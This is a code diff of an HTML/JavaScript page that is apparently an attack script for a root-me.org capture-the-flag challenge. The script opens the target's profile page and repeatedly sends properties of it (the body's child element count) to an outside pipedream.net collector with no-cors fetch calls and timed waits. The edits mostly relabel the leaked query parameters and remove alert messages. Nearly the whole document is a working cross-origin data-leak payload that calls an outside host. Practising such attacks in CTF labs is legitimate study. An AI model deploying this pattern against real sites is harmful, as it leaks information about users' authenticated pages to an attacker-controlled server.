@@ -5,10 +5,10 @@
 <script>
 
 async function testWait(aaa) {
-    alert('going to wait for 5 second');
     await wait(5000);
-    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
-    alert('finally wait is over');
+    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=4' + aaa.document.body.childElementCount, {mode: 'no-cors'})
+    await wait(5000);
+    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=5' + aaa.document.body.childElementCount, {mode: 'no-cors'})
 }
 
 function wait(time) {
@@ -28,13 +28,13 @@ try{
 try{
 	var aaa = open('http://challenge01.root-me.org:58003/profile');
 
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size0=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=1' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=2' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=3' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
 	testWait(aaa)
 	aaa.onload = function() {fetch('https://en6gc9c8vfzvo.x.pipedream.net/?loaded0', {mode: 'no-cors'});}
